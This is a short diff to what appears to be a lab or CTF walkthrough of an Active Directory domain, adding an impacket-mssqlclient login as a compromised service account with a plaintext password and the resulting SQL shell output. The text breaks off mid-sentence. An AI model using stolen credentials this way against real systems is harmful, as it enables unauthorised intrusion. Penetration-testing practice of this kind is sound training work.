@@ -486,5 +486,18 @@ Now this user is compromised!
 # Access over mssql as `svc_mssql` user
 
 ```python
+impacket-mssqlclient shadowgate.local/svc_mssql:'Password123!'@sg-dc01.shadowgate.local -windows-auth
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SG-DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(SG-DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (SHADOWGATE\svc_mssql  guest@master)>
 ```
+
+I cannot enabled 
